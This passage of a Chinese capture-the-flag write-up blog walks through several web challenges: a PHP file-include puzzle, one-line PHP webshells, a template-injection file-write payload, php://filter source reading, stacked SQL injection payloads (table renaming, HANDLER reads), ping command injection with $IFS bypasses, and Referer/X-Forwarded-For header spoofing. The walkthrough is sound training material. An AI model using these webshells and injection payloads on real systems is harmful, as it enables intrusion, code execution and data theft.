class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token global&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token scope&#34;&gt;emmm&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;checkFile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token global&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token global&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&amp;lt;img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/warmup.png&#34; alt=&#34;aa&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;5相关一句马知识点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5相关一句马知识点&#34;&gt;#&lt;/a&gt; 5. 相关一句马 (知识点)&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_REQUEST[&#39;key&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php system($_REQUEST[&#39;ab12&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_POST[123]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;webshell 分别为：key，ab12,123&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;? a=fetch&amp;amp;templateFile=public/index&amp;amp;prefix=&#39;&#39;&amp;amp;content&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&#39;)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/yijian.png&#34; alt=&#34;yijian&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//yijjian1.png&#34; alt=&#34;yijian1&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;6php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6php伪协议&#34;&gt;#&lt;/a&gt; 6.PHP 伪协议&lt;/h3&gt;
&lt;p&gt;需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp&lt;/p&gt;
&lt;p&gt;不需要开启 allow_wrl_fopen 的：php://filter&lt;/p&gt;
&lt;p&gt;在 CTF 中常用的 php://filter&lt;/p&gt;
&lt;p&gt;php://filter 用于读取源码，php://input 用于执行 php 代码&lt;br /&gt;
 php://input 需要 post 提交数据&lt;br /&gt;
 php://filter 可以提交？a=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/p&gt;
&lt;p&gt;url 中？代表传值的意思，id 代表变量，后面的 &amp;quot;=&amp;quot; 代表变量的值&lt;/p&gt;
&lt;h3 id=&#34;7suctf-2019easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7suctf-2019easysql&#34;&gt;#&lt;/a&gt; 7.[SUCTF 2019]EasySQL&lt;/h3&gt;
&lt;p&gt;一道 sql 注入的题目，题目原意是堆叠注入或该换 || 的用处。然而 wp 中却给出了一种短路处理的办法。&lt;/p&gt;
&lt;p&gt;我们来细究一下它的原理。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;直接注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#直接注&#34;&gt;#&lt;/a&gt; 直接注&lt;/h4&gt;
&lt;p&gt;首先吗看题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql1.jpg&#34; alt=&#34;easysql1&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后寻找注入点，先试试 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后回显不是 “无” 就是 Nonono.&lt;/p&gt;
&lt;p&gt;在用字符，和整数试试。发现字符时无回显，整数时有！！&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql2.jpg&#34; alt=&#34;easysql2&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这是一个表结构！！&lt;/p&gt;
&lt;p&gt;再审题，发现他说” 查询 “？怀疑这是个内嵌的后端查询，就是说它的&lt;strong&gt;源码&lt;/strong&gt;可能是&lt;/p&gt;
&lt;p&gt;&lt;code&gt; select $_POST[&#39;query&#39;] from xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;越来越靠近真相了！！&lt;/p&gt;
&lt;p&gt;所以它应该是对 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;  报错了所以什么都不回显或者是过滤，再试试 database () 发现没有用？？&lt;/p&gt;
&lt;p&gt;上面能回显整数却不回显字符 (a,b,c...)，em... 有问题。&lt;/p&gt;
&lt;p&gt;回想上一张输入整数的图，他回显了个 &lt;code&gt;Array ( [0] =&amp;gt; 1 )&lt;/code&gt; ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。&lt;/p&gt;
&lt;p&gt;继续，结合题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Give me your flag, I will tell you if the flag is right.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag？is right？  很可能这条数据就是 flag！！！&lt;/p&gt;
&lt;p&gt;说明这个源码查询的就是 flag！但查不出来为什么？再思考。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt; select 1 from xxx&lt;/code&gt;  得到的结果就是，一堆 1，1 的数量与数据数量有关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;又题目输入整数时它都得到 1，所以可能这里有个&lt;strong&gt;或结构&lt;/strong&gt;，&lt;/p&gt;
&lt;p&gt;所以在 $_POST [&#39;query&#39;] 这块肯定有玄机，2 xxx =&amp;gt; 1??&lt;/p&gt;
&lt;p&gt;难道是 || 语法？试试 0. 0 的话查不出来.&lt;/p&gt;
&lt;p&gt;再回想源码，（&lt;em&gt;&lt;strong&gt;结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;所以应该是，&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;flag &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;flag 本身是假的，不然早注成了！！&lt;/p&gt;
&lt;p&gt;所以直接构造 &lt;code&gt; *,1&lt;/code&gt;  (联系到 select 查询多个的语法)&lt;/p&gt;
&lt;p&gt;然后破案了。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql_end.jpg&#34; alt=&#34;easysql_end&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;另一种姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#另一种姿势&#34;&gt;#&lt;/a&gt; 另一种姿势&lt;/h4&gt;
&lt;p&gt;先上 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; sql_mode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pipes_as_concat&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;(前面一个 1 隔断前置 select 后面一个 1？)&lt;br /&gt;
 你直接看这英语意思：&lt;/p&gt;
&lt;p&gt;pipes_as_concat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;就是把 || 设置成了 concat 函数呗。。。&lt;/strong&gt;&lt;br /&gt;
这也是&lt;strong&gt;猜出了后端代码&lt;/strong&gt;的。&lt;/p&gt;
&lt;p&gt;但是要注意 &amp;lt;u&amp;gt; 分号隔断了前面的命令 &amp;lt;/u&amp;gt;(堆叠注入)，所以要再次添加 select!!&lt;/p&gt;
&lt;p&gt;上面那句执行是：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;搞定。&lt;/p&gt;
&lt;h3 id=&#34;8easy_sql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8easy_sql&#34;&gt;#&lt;/a&gt; 8.Easy_sql&lt;/h3&gt;
&lt;p&gt;有报错但发现 union select 被过滤了，&lt;/p&gt;
&lt;p&gt;where 也被过滤了，但可以堆叠。&lt;/p&gt;
&lt;p&gt;所以使用了 show tables 查表，show columns from ’table‘ 查字段&lt;/p&gt;
&lt;p&gt;找到了 flag 字段，问题在于如何查询 flag？这里给出了两种解法。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当我们输入 1 时回显数据，并发现当输入 &#39; 时报错，联系题目提示的查询，这里的源代码应该时和 select 有关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用更改表名和字段名的方法使其默认查询的表字段变为 flag 的。&lt;/p&gt;
&lt;p&gt;payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;rename&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words1&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;rename&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;使用了 rename，和 alter，进行修改。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用 mysql 所支持的另一种查询语句。&lt;/p&gt;
&lt;p&gt;payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;这里需要注意，在之前是先验证了它有回显，有报错，有堆叠！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相关资料： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plc3NlWW91bmcvYXJ0aWNsZS9kZXRhaWxzLzQwNzg1MTM3P2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbUJhaWR1LTEmYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21CYWlkdS0x&#34;&gt;handler 语法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easy_sql.jpg&#34; alt=&#34;easy_sql&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;9actf2020-新生赛exec&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9actf2020-新生赛exec&#34;&gt;#&lt;/a&gt; 9.[ACTF2020 新生赛] Exec&lt;/h3&gt;
&lt;p&gt;本题是一道 Linux 命令题。&lt;/p&gt;
&lt;p&gt;注：ping 本身是一种命令行为。&lt;/p&gt;
&lt;p&gt;通过分号断开。&lt;/p&gt;
&lt;p&gt;payload 为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1;ls
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;试探是否能命令语句注入。&lt;/p&gt;
&lt;p&gt;结果可以。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1;ls /;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;遍历目录下的文件。发现 flag 文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1;cat /flag;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到 flag。&lt;/p&gt;
&lt;h3 id=&#34;10gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; 10.[GXYCTF2019]Ping Ping Ping&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;$IFS$1&lt;/code&gt; , &lt;code&gt; %09&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;为什么用内联执行&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;token string backtick-quoted-string&#34;&gt;`ls`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjY0MjU4MTY1MTY4MDAxODY1MTAwNTMlMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY2NDI1ODE2NTE2ODAwMTg2NTEwMDUzJmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+dG9wX3Bvc2l0aXZlfmRlZmF1bHQtMS0xMjQ2MTYyMDYtbnVsbC1udWxsLjE0MiU1RXY1MCU1RWNvbnRyb2wsMjAxJTVFdjMlNUVjb250cm9sXzEmYW1wO3V0bV90ZXJtPSU1QkdYWUNURjIwMTklNURQaW5nJTIwUGluZyUyMFBpbmcmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3&#34;&gt;Linux 绕过&lt;/span&gt;，&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY=&#34;&gt;详解&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;11secret-file&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11secret-file&#34;&gt;#&lt;/a&gt; 11.Secret File&lt;/h3&gt;
&lt;p&gt;找文件，抓包，看源码，找提示。&lt;/p&gt;
&lt;p&gt;伪协议读取 flag.php&lt;/p&gt;
&lt;h3 id=&#34;12lovesql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12lovesql&#34;&gt;#&lt;/a&gt; 12.LoveSQL&lt;/h3&gt;
&lt;p&gt;试试，直接注，找到提示表，查询到 flag。&lt;/p&gt;
&lt;h3 id=&#34;13http&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13http&#34;&gt;#&lt;/a&gt; 13.HTTP&lt;/h3&gt;
&lt;p&gt;打开靶场，查看源码。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/aaahtp.jpg&#34; alt=&#34;http_1&#34; /&gt;&lt;/p&gt;
&lt;p&gt;进入 secret.php 发现如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/ahttp_1.jpg&#34; alt=&#34;ahttp_1&#34; /&gt;&lt;/p&gt;
&lt;p&gt;此处是一个对报文来源的要求，用 burp 抓包，&lt;strong&gt;修改来源，发现没有 Referer，手动添加到 upgrade 上，或 cookie 上，内容 &lt;code&gt;Referer: https://Sycsecret.buuoj.cn&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;再发送。得到 Response，要求用 &amp;quot;Syclover&amp;quot; 浏览器，&lt;strong&gt;在 User-Agent 中修改，Firefox 为 Syclover。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;再发送。得到 Response，&lt;strong&gt;&amp;quot;Read this locally!&amp;quot;&lt;/strong&gt;，在 upgrade 上加一行 ** &lt;code&gt;X-Forwarded-For: 127.0.0.1&lt;/code&gt; .**&lt;/p&gt;
&lt;p&gt;再发送。就再 Responce 中得到 flag.&lt;/p&gt;
